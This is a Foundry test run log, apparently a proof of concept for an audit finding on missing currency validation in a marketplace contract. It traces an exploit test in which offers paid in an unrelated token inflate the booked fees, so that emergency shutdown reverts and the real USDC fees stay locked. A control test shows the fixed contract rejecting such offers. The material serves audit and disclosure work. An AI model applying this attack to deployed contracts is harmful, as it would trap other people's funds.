@@ -1,0 +1,265 @@
+Compiling 20 files with Solc 0.8.27
+Solc 0.8.27 finished in 2.23s
+Compiler run successful!
+
+Ran 2 tests for test/62542-h-05-currency-validation-missing-in-listing-and-offer-reques_exp.sol:CurrencyValidationMissingTest
+[PASS] test_control_currencyCheck_keepsFeesWithdrawable() (gas: 1314174)
+Traces:
+  [1393774] CurrencyValidationMissingTest::test_control_currencyCheck_keepsFeesWithdrawable()
+    ├─ [342861] → new MiniToken@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+    │   ├─  storage changes:
+    │   │   @ 1: 0 → 0x5553444300000000000000000000000000000000000000000000000000000008
+    │   │   @ 2: 0 → 6
+    │   │   @ 0: 0 → 0x55534420436f696e000000000000000000000000000000000000000000000010
+    │   └─ ← [Return] 1373 bytes of code
+    ├─ [342861] → new MiniToken@0x2e234DAe75C793f67A35089C9d99245E1C58470b
+    │   ├─  storage changes:
+    │   │   @ 1: 0 → 0x574f52544800000000000000000000000000000000000000000000000000000a
+    │   │   @ 2: 0 → 18
+    │   │   @ 0: 0 → 0x576f7274686c6573730000000000000000000000000000000000000000000012
+    │   └─ ← [Return] 1373 bytes of code
+    ├─ [359281] → new MarketplaceFixed@0xF62849F9A0B5Bf2913b396098F7c7019b51A820a
+    │   ├─  storage changes:
+    │   │   @ 2: 0 → 85
+    │   │   @ 0: 0 → 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
+    │   │   @ 3: 0 → 250
+    │   │   @ 1: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   └─ ← [Return] 1350 bytes of code
+    ├─ [44724] MiniToken::mint(CurrencyValidationMissingTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 40000000000 [4e10])
+    │   ├─  storage changes:
+    │   │   @ 0x9a37937c0ede8c307bf0496ec60e131422d44420befc187978dc5326d56d38a4: 0 → 0x00000000000000000000000000000000000000000000000000000009502f9000
+    │   │   @ 3: 0 → 0x00000000000000000000000000000000000000000000000000000009502f9000
+    │   └─ ← [Stop]
+    ├─ [44724] MiniToken::mint(CurrencyValidationMissingTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 40000000000 [4e10])
+    │   ├─  storage changes:
+    │   │   @ 0x9a37937c0ede8c307bf0496ec60e131422d44420befc187978dc5326d56d38a4: 0 → 0x00000000000000000000000000000000000000000000000000000009502f9000
+    │   │   @ 3: 0 → 0x00000000000000000000000000000000000000000000000000000009502f9000
+    │   └─ ← [Stop]
+    ├─ [22492] MiniToken::approve(MarketplaceFixed: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   ├─  storage changes:
+    │   │   @ 0x72e706d2d1710b736a037c5634734c51706857f22dd662a4f3d29cbaf03edc57: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   └─ ← [Return] true
+    ├─ [22492] MiniToken::approve(MarketplaceFixed: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   ├─  storage changes:
+    │   │   @ 0x72e706d2d1710b736a037c5634734c51706857f22dd662a4f3d29cbaf03edc57: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   └─ ← [Return] true
+    ├─ [72117] MarketplaceFixed::acceptOffer([OfferParams({ request: OfferRequest({ tokenContractAddress: 0x0000000000000000000000000000000000000000, tokenId: 0, price: 40000000000 [4e10], offerCurrency: 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f, deadline: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77], requester: 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, chainId: 31337 [3.133e4] }), sig: 0x, receiver: 0x0000000000000000000000000000000000000077, receiverSig: 0x })])
+    │   ├─ [23368] MiniToken::transferFrom(CurrencyValidationMissingTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x0000000000000000000000000000000000000077, 39000000000 [3.9e10])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x299a41a9c8fccbdb0fa0d17ef1b1c6a16f016088dbcb119a5eab4713916c52b4: 0 → 0x000000000000000000000000000000000000000000000000000000091494c600
+    │   │   │   @ 0x72e706d2d1710b736a037c5634734c51706857f22dd662a4f3d29cbaf03edc57: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff → 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffff6eb6b39ff
+    │   │   │   @ 0x9a37937c0ede8c307bf0496ec60e131422d44420befc187978dc5326d56d38a4: 0x00000000000000000000000000000000000000000000000000000009502f9000 → 0x000000000000000000000000000000000000000000000000000000003b9aca00
+    │   │   └─ ← [Return] true
+    │   ├─ [23368] MiniToken::transferFrom(CurrencyValidationMissingTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], MarketplaceFixed: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], 1000000000 [1e9])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x9a37937c0ede8c307bf0496ec60e131422d44420befc187978dc5326d56d38a4: 0x000000000000000000000000000000000000000000000000000000003b9aca00 → 0
+    │   │   │   @ 0x72e706d2d1710b736a037c5634734c51706857f22dd662a4f3d29cbaf03edc57: 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffff6eb6b39ff → 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffff6afd06fff
+    │   │   │   @ 0xd518eb0c450b7cb6cde9c89785309342131a13b97904292f190d4079230ea42c: 0 → 0x000000000000000000000000000000000000000000000000000000003b9aca00
+    │   │   └─ ← [Return] true
+    │   ├─  storage changes:
+    │   │   @ 4: 0 → 0x000000000000000000000000000000000000000000000000000000003b9aca00
+    │   └─ ← [Stop]
+    ├─ [248] MarketplaceFixed::totalPendingFees() [staticcall]
+    │   └─ ← [Return] 1000000000 [1e9]
+    ├─ [0] VM::assertEq(1000000000 [1e9], 1000000000 [1e9], "backed fee booked") [staticcall]
+    │   └─ ← [Return]
+    ├─ [530] MiniToken::balanceOf(MarketplaceFixed: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a]) [staticcall]
+    │   └─ ← [Return] 1000000000 [1e9]
+    ├─ [0] VM::assertEq(1000000000 [1e9], 1000000000 [1e9], "real USDC held") [staticcall]
+    │   └─ ← [Return]
+    ├─ [0] VM::expectRevert(custom error 0xc31eb0e0: 43d3b9f000000000000000000000000000000000000000000000000000000000)
+    │   └─ ← [Return]
+    ├─ [758] MarketplaceFixed::acceptOffer([OfferParams({ request: OfferRequest({ tokenContractAddress: 0x0000000000000000000000000000000000000000, tokenId: 0, price: 40000000000 [4e10], offerCurrency: 0x2e234DAe75C793f67A35089C9d99245E1C58470b, deadline: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77], requester: 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, chainId: 31337 [3.133e4] }), sig: 0x, receiver: 0x0000000000000000000000000000000000000077, receiverSig: 0x })])
+    │   └─ ← [Revert] MismatchedCurrency()
+    ├─ [248] MarketplaceFixed::totalPendingFees() [staticcall]
+    │   └─ ← [Return] 1000000000 [1e9]
+    ├─ [0] VM::assertEq(1000000000 [1e9], 1000000000 [1e9], "no phantom fee booked") [staticcall]
+    │   └─ ← [Return]
+    ├─ [24631] MarketplaceFixed::emergencyShutdown()
+    │   ├─ [22980] MiniToken::transfer(0x0000000000000000000000000000000000000055, 1000000000 [1e9])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x5f7f545aaa94cc2a7d8c758dba96fa2c03dbc5fafbcb4ad930aa5baf56c6bad4: 0 → 0x000000000000000000000000000000000000000000000000000000003b9aca00
+    │   │   │   @ 0xd518eb0c450b7cb6cde9c89785309342131a13b97904292f190d4079230ea42c: 0x000000000000000000000000000000000000000000000000000000003b9aca00 → 0
+    │   │   └─ ← [Return] true
+    │   ├─  storage changes:
+    │   │   @ 0: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f → 0
+    │   │   @ 4: 0x000000000000000000000000000000000000000000000000000000003b9aca00 → 0
+    │   └─ ← [Stop]
+    ├─ [530] MiniToken::balanceOf(0x0000000000000000000000000000000000000055) [staticcall]
+    │   └─ ← [Return] 1000000000 [1e9]
+    ├─ [0] VM::assertEq(1000000000 [1e9], 1000000000 [1e9], "feeReceiver paid the real fees") [staticcall]
+    │   └─ ← [Return]
+    ├─ [301] MarketplaceFixed::acceptedCurrency() [staticcall]
+    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
+    ├─ [0] VM::assertEq(0x0000000000000000000000000000000000000000, 0x0000000000000000000000000000000000000000, "shutdown completed cleanly") [staticcall]
+    │   └─ ← [Return]
+    └─ ← [Return]
+
+[PASS] test_exploit_phantomFee_locksRealFees() (gas: 4164043)
+Traces:
+  [4203843] CurrencyValidationMissingTest::test_exploit_phantomFee_locksRealFees()
+    ├─ [1769073] → new Exploit@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+    │   └─ ← [Return] 8836 bytes of code
+    ├─ [2375034] Exploit::run()
+    │   ├─ [342861] → new MiniToken@0x104fBc016F4bb334D775a19E8A6510109AC63E00
+    │   │   ├─  storage changes:
+    │   │   │   @ 0: 0 → 0x55534420436f696e000000000000000000000000000000000000000000000010
+    │   │   │   @ 1: 0 → 0x5553444300000000000000000000000000000000000000000000000000000008
+    │   │   │   @ 2: 0 → 6
+    │   │   └─ ← [Return] 1373 bytes of code
+    │   ├─ [342861] → new MiniToken@0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3
+    │   │   ├─  storage changes:
+    │   │   │   @ 1: 0 → 0x574f52544800000000000000000000000000000000000000000000000000000a
+    │   │   │   @ 0: 0 → 0x576f7274686c6573730000000000000000000000000000000000000000000012
+    │   │   │   @ 2: 0 → 18
+    │   │   └─ ← [Return] 1373 bytes of code
+    │   ├─ [701015] → new Marketplace@0xDDc10602782af652bB913f7bdE1fD82981Db7dd9
+    │   │   ├─  storage changes:
+    │   │   │   @ 0: 0 → 0x000000000000000000000000104fbc016f4bb334d775a19e8a6510109ac63e00
+    │   │   │   @ 2: 0 → 85
+    │   │   │   @ 3: 0 → 250
+    │   │   │   @ 1: 0 → 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
+    │   │   └─ ← [Return] 3057 bytes of code
+    │   ├─ [342861] → new MiniToken@0x7FdB3132Ff7D02d8B9e221c61cC895ce9a4bb773
+    │   │   ├─  storage changes:
+    │   │   │   @ 0: 0 → 0x4c6f636b65642055534443204d61726b65720000000000000000000000000024
+    │   │   │   @ 1: 0 → 0x4c4f434b45442d55534443000000000000000000000000000000000000000016
+    │   │   │   @ 2: 0 → 6
+    │   │   └─ ← [Return] 1373 bytes of code
+    │   ├─ [44724] MiniToken::mint(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 40000000000 [4e10])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x407b49835a0660cb9d08bcabbbc30a7b3e9142e82d009d6a63d932db9d6b3349: 0 → 0x00000000000000000000000000000000000000000000000000000009502f9000
+    │   │   │   @ 3: 0 → 0x00000000000000000000000000000000000000000000000000000009502f9000
+    │   │   └─ ← [Stop]
+    │   ├─ [44724] MiniToken::mint(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 40000000000 [4e10])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x407b49835a0660cb9d08bcabbbc30a7b3e9142e82d009d6a63d932db9d6b3349: 0 → 0x00000000000000000000000000000000000000000000000000000009502f9000
+    │   │   │   @ 3: 0 → 0x00000000000000000000000000000000000000000000000000000009502f9000
+    │   │   └─ ← [Stop]
+    │   ├─ [22492] MiniToken::approve(Marketplace: [0xDDc10602782af652bB913f7bdE1fD82981Db7dd9], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x229e8be67c73a72b50caa829de496f16860908965c72bdc15b766e494adb7072: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   └─ ← [Return] true
+    │   ├─ [22492] MiniToken::approve(Marketplace: [0xDDc10602782af652bB913f7bdE1fD82981Db7dd9], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x229e8be67c73a72b50caa829de496f16860908965c72bdc15b766e494adb7072: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   └─ ← [Return] true
+    │   ├─ [71908] Marketplace::acceptOffer([OfferParams({ request: OfferRequest({ tokenContractAddress: 0x0000000000000000000000000000000000000000, tokenId: 0, price: 40000000000 [4e10], offerCurrency: 0x104fBc016F4bb334D775a19E8A6510109AC63E00, deadline: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77], requester: 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f, chainId: 31337 [3.133e4] }), sig: 0x, receiver: 0x0000000000000000000000000000000000000077, receiverSig: 0x })])
+    │   │   ├─ [23368] MiniToken::transferFrom(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x0000000000000000000000000000000000000077, 39000000000 [3.9e10])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x229e8be67c73a72b50caa829de496f16860908965c72bdc15b766e494adb7072: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff → 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffff6eb6b39ff
+    │   │   │   │   @ 0x407b49835a0660cb9d08bcabbbc30a7b3e9142e82d009d6a63d932db9d6b3349: 0x00000000000000000000000000000000000000000000000000000009502f9000 → 0x000000000000000000000000000000000000000000000000000000003b9aca00
+    │   │   │   │   @ 0x299a41a9c8fccbdb0fa0d17ef1b1c6a16f016088dbcb119a5eab4713916c52b4: 0 → 0x000000000000000000000000000000000000000000000000000000091494c600
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [23368] MiniToken::transferFrom(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], Marketplace: [0xDDc10602782af652bB913f7bdE1fD82981Db7dd9], 1000000000 [1e9])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x229e8be67c73a72b50caa829de496f16860908965c72bdc15b766e494adb7072: 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffff6eb6b39ff → 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffff6afd06fff
+    │   │   │   │   @ 0x407b49835a0660cb9d08bcabbbc30a7b3e9142e82d009d6a63d932db9d6b3349: 0x000000000000000000000000000000000000000000000000000000003b9aca00 → 0
+    │   │   │   │   @ 0x12c18fee12f6027cb591dac574a55583a3fbb09860a0fce2ac98381d836d6de9: 0 → 0x000000000000000000000000000000000000000000000000000000003b9aca00
+    │   │   │   └─ ← [Return] true
+    │   │   ├─  storage changes:
+    │   │   │   @ 4: 0 → 0x000000000000000000000000000000000000000000000000000000003b9aca00
+    │   │   └─ ← [Stop]
+    │   ├─ [50008] Marketplace::acceptOffer([OfferParams({ request: OfferRequest({ tokenContractAddress: 0x0000000000000000000000000000000000000000, tokenId: 0, price: 40000000000 [4e10], offerCurrency: 0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3, deadline: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77], requester: 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f, chainId: 31337 [3.133e4] }), sig: 0x, receiver: 0x0000000000000000000000000000000000000077, receiverSig: 0x })])
+    │   │   ├─ [23368] MiniToken::transferFrom(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x0000000000000000000000000000000000000077, 39000000000 [3.9e10])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x299a41a9c8fccbdb0fa0d17ef1b1c6a16f016088dbcb119a5eab4713916c52b4: 0 → 0x000000000000000000000000000000000000000000000000000000091494c600
+    │   │   │   │   @ 0x407b49835a0660cb9d08bcabbbc30a7b3e9142e82d009d6a63d932db9d6b3349: 0x00000000000000000000000000000000000000000000000000000009502f9000 → 0x000000000000000000000000000000000000000000000000000000003b9aca00
+    │   │   │   │   @ 0x229e8be67c73a72b50caa829de496f16860908965c72bdc15b766e494adb7072: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff → 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffff6eb6b39ff
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [23368] MiniToken::transferFrom(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], Marketplace: [0xDDc10602782af652bB913f7bdE1fD82981Db7dd9], 1000000000 [1e9])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x229e8be67c73a72b50caa829de496f16860908965c72bdc15b766e494adb7072: 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffff6eb6b39ff → 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffff6afd06fff
+    │   │   │   │   @ 0x407b49835a0660cb9d08bcabbbc30a7b3e9142e82d009d6a63d932db9d6b3349: 0x000000000000000000000000000000000000000000000000000000003b9aca00 → 0
+    │   │   │   │   @ 0x12c18fee12f6027cb591dac574a55583a3fbb09860a0fce2ac98381d836d6de9: 0 → 0x000000000000000000000000000000000000000000000000000000003b9aca00
+    │   │   │   └─ ← [Return] true
+    │   │   ├─  storage changes:
+    │   │   │   @ 4: 0x000000000000000000000000000000000000000000000000000000003b9aca00 → 0x0000000000000000000000000000000000000000000000000000000077359400
+    │   │   └─ ← [Stop]
+    │   ├─ [248] Marketplace::totalPendingFees() [staticcall]
+    │   │   └─ ← [Return] 2000000000 [2e9]
+    │   ├─ [530] MiniToken::balanceOf(Marketplace: [0xDDc10602782af652bB913f7bdE1fD82981Db7dd9]) [staticcall]
+    │   │   └─ ← [Return] 1000000000 [1e9]
+    │   ├─ [1844] Marketplace::emergencyShutdown()
+    │   │   ├─ [627] MiniToken::transfer(0x0000000000000000000000000000000000000055, 2000000000 [2e9])
+    │   │   │   └─ ← [Revert] panic: arithmetic underflow or overflow (0x11)
+    │   │   ├─  storage changes:
+    │   │   │   @ 4: 0x0000000000000000000000000000000000000000000000000000000077359400 → 0
+    │   │   └─ ← [Revert] panic: arithmetic underflow or overflow (0x11)
+    │   ├─ [301] Marketplace::acceptedCurrency() [staticcall]
+    │   │   └─ ← [Return] MiniToken: [0x104fBc016F4bb334D775a19E8A6510109AC63E00]
+    │   ├─ [530] MiniToken::balanceOf(Marketplace: [0xDDc10602782af652bB913f7bdE1fD82981Db7dd9]) [staticcall]
+    │   │   └─ ← [Return] 1000000000 [1e9]
+    │   ├─ [44724] MiniToken::mint(0x000000000000000000000000000000000000D00d, 1000000000 [1e9])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x349f48d35b1f5bfc4d5a795662680c2ae9b2bdeb3b109b21f91a0afd4cea47c9: 0 → 0x000000000000000000000000000000000000000000000000000000003b9aca00
+    │   │   │   @ 3: 0 → 0x000000000000000000000000000000000000000000000000000000003b9aca00
+    │   │   └─ ← [Stop]
+    │   ├─ [530] MiniToken::balanceOf(0x000000000000000000000000000000000000D00d) [staticcall]
+    │   │   └─ ← [Return] 1000000000 [1e9]
+    │   ├─  storage changes:
+    │   │   @ 2: 0 → 0x000000000000000000000000000000000000000000000000000000003b9aca00
+    │   │   @ 3: 0 → 1
+    │   │   @ 8: 0 → 0x0000000000000000000000007fdb3132ff7d02d8b9e221c61cc895ce9a4bb773
+    │   │   @ 5: 0 → 0x000000000000000000000000000000000000000000000000000000003b9aca00
+    │   │   @ 6: 0 → 0x000000000000000000000000ddc10602782af652bb913f7bde1fd82981db7dd9
+    │   │   @ 1: 0 → 0x000000000000000000000000000000000000000000000000000000003b9aca00
+    │   │   @ 7: 0 → 0x000000000000000000000000104fbc016f4bb334d775a19e8a6510109ac63e00
+    │   │   @ 4: 0 → 0x000000000000000000000000000000000000000000000000000000003b9aca00
+    │   │   @ 0: 0 → 0x0000000000000000000000000000000000000000000000000000000077359400
+    │   └─ ← [Return]
+    ├─ [304] Exploit::buggyTotalPendingFees() [staticcall]
+    │   └─ ← [Return] 2000000000 [2e9]
+    ├─ [0] VM::assertEq(2000000000 [2e9], 2000000000 [2e9], "totalPendingFees inflated to 2F") [staticcall]
+    │   └─ ← [Return]
+    ├─ [283] Exploit::backedUsdc() [staticcall]
+    │   └─ ← [Return] 1000000000 [1e9]
+    ├─ [0] VM::assertEq(1000000000 [1e9], 1000000000 [1e9], "contract holds only F real USDC") [staticcall]
+    │   └─ ← [Return]
+    ├─ [253] Exploit::phantomFees() [staticcall]
+    │   └─ ← [Return] 1000000000 [1e9]
+    ├─ [0] VM::assertEq(1000000000 [1e9], 1000000000 [1e9], "F of fees are phantom (unbacked)") [staticcall]
+    │   └─ ← [Return]
+    ├─ [427] Exploit::shutdownReverted() [staticcall]
+    │   └─ ← [Return] true
+    ├─ [0] VM::assertTrue(true, "emergencyShutdown reverts (2F > F held)") [staticcall]
+    │   └─ ← [Return]
+    ├─ [327] Exploit::lockedRealUsdc() [staticcall]
+    │   └─ ← [Return] 1000000000 [1e9]
+    ├─ [0] VM::assertEq(1000000000 [1e9], 1000000000 [1e9], "real USDC fees locked") [staticcall]
+    │   └─ ← [Return]
+    ├─ [417] Exploit::markerAddr() [staticcall]
+    │   └─ ← [Return] MiniToken: [0x7FdB3132Ff7D02d8B9e221c61cC895ce9a4bb773]
+    ├─ [530] MiniToken::balanceOf(0x000000000000000000000000000000000000D00d) [staticcall]
+    │   └─ ← [Return] 1000000000 [1e9]
+    ├─ [0] VM::assertEq(1000000000 [1e9], 1000000000 [1e9], "marker records locked magnitude at SINK") [staticcall]
+    │   └─ ← [Return]
+    ├─ [461] Exploit::marketplaceAddr() [staticcall]
+    │   └─ ← [Return] Marketplace: [0xDDc10602782af652bB913f7bdE1fD82981Db7dd9]
+    ├─ [301] Marketplace::acceptedCurrency() [staticcall]
+    │   └─ ← [Return] MiniToken: [0x104fBc016F4bb334D775a19E8A6510109AC63E00]
+    ├─ [373] Exploit::usdcAddr() [staticcall]
+    │   └─ ← [Return] MiniToken: [0x104fBc016F4bb334D775a19E8A6510109AC63E00]
+    ├─ [0] VM::assertEq(MiniToken: [0x104fBc016F4bb334D775a19E8A6510109AC63E00], MiniToken: [0x104fBc016F4bb334D775a19E8A6510109AC63E00], "shutdown did not complete") [staticcall]
+    │   └─ ← [Return]
+    ├─ [248] Marketplace::totalPendingFees() [staticcall]
+    │   └─ ← [Return] 2000000000 [2e9]
+    ├─ [0] VM::assertEq(2000000000 [2e9], 2000000000 [2e9], "over-booked total persists") [staticcall]
+    │   └─ ← [Return]
+    ├─ [373] Exploit::usdcAddr() [staticcall]
+    │   └─ ← [Return] MiniToken: [0x104fBc016F4bb334D775a19E8A6510109AC63E00]
+    ├─ [461] Exploit::marketplaceAddr() [staticcall]
+    │   └─ ← [Return] Marketplace: [0xDDc10602782af652bB913f7bdE1fD82981Db7dd9]
+    ├─ [530] MiniToken::balanceOf(Marketplace: [0xDDc10602782af652bB913f7bdE1fD82981Db7dd9]) [staticcall]
+    │   └─ ← [Return] 1000000000 [1e9]
+    ├─ [0] VM::assertEq(1000000000 [1e9], 1000000000 [1e9], "real fees remain trapped") [staticcall]
+    │   └─ ← [Return]
+    ├─ [2530] MiniToken::balanceOf(0x0000000000000000000000000000000000000055) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::assertEq(0, 0, "feeReceiver received nothing") [staticcall]
+    │   └─ ← [Return]
+    └─ ← [Return]
+
+Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 2.18ms (3.62ms CPU time)
+
+Ran 1 test suite in 126.65ms (2.18ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
